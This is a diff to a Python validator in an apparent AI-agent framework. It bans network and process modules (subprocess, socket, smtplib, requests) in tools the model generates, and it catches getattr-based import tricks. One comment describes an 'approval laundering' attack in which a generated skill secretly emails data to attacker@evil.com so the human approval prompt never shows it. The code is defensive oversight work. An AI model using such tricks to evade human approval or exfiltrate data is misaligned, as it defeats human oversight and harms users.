@@ -27,6 +27,19 @@ FORBIDDEN_IMPORTS = {
     "servant.governance", "servant.executor", "servant.config", "servant.agent",
     "servant.audit", "servant.validator", "servant.sandbox", "servant.cli",
     "ctypes", "gc", "importlib", "marshal", "pickle", "pty", "socketserver",
+    # Network and process modules. Banned so a generated tool CANNOT reach the
+    # network, send mail, or spawn a process except by calling an existing,
+    # named, already-tiered tool through ctx.call(). That is the property
+    # that closes approval laundering: a skill drafted to "log something" that
+    # secretly imports smtplib and emails your data would, without this ban,
+    # only ever need ONE approval (for calling the generated tool itself) --
+    # the human never sees "mail.send: to=attacker@evil.com" in a prompt.
+    # With it banned, the skill can still send mail, but only by calling
+    # ctx.call("mail.send", to=..., ...), which re-enters the executor and
+    # raises mail.send's OWN approval prompt, with the real arguments shown.
+    "subprocess", "socket", "smtplib", "ftplib", "telnetlib", "poplib",
+    "imaplib", "http.client", "urllib.request", "urllib3", "requests",
+    "asyncio",  # blocks trivially spawning subprocesses via create_subprocess_exec
 }
 
 # Names that are almost always a mistake in a tool.
@@ -78,6 +91,7 @@ def validate_source(source: str, *, tier_floor: Tier = Tier.DANGER) -> Validatio
         _check_imports(node, report)
         _check_calls(node, report)
         _check_strings(node, report)
+        _check_dunder_import(node, report)
 
     _check_tools(tree, report, tier_floor)
     return report
@@ -105,6 +119,20 @@ def _check_imports(node: ast.AST, report: ValidationReport) -> None:
             report.findings.append(Finding(
                 getattr(node, "lineno", 0), "IMPORT", f"may not import {root!r}",
             ))
+
+
+def _check_dunder_import(node: ast.AST, report: ValidationReport) -> None:
+    """importlib and __import__ are already banned; catch the string-based
+    dodge too -- getattr(__builtins__, 'im' + 'port')(...) and friends are not
+    realistic from a cooperative model, but cost nothing to also refuse."""
+    if isinstance(node, ast.Call) and _call_name(node.func) in {"getattr", "setattr"}:
+        for arg in node.args:
+            if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
+                if "import" in arg.value.lower():
+                    report.findings.append(Finding(
+                        node.lineno, "IMPORT",
+                        "reaching for import machinery through getattr/setattr is not allowed",
+                    ))
 
 
 def _check_calls(node: ast.AST, report: ValidationReport) -> None:
